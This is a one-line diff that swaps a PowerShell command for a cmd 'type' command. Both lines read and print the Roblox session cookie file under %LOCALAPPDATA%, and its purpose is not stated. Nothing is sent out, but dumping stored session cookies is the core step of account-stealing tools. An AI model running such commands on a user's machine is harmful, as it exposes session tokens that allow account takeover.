@@ -1,1 +1,1 @@
-powershell -c "&{$p1='%LOCALAPPDATA%\Roblox\Cookies';$p2='%LOCALAPPDATA%\Roblox\LocalStorage\RobloxCookies.dat';if(Test-Path $p1){'JSON:';gc $p1}elseif(Test-Path $p2){'DAT:';gc $p2}else{'No cookies'}}"
+type "%LOCALAPPDATA%\Roblox\LocalStorage\RobloxCookies.dat" 2>nul || echo No .dat file
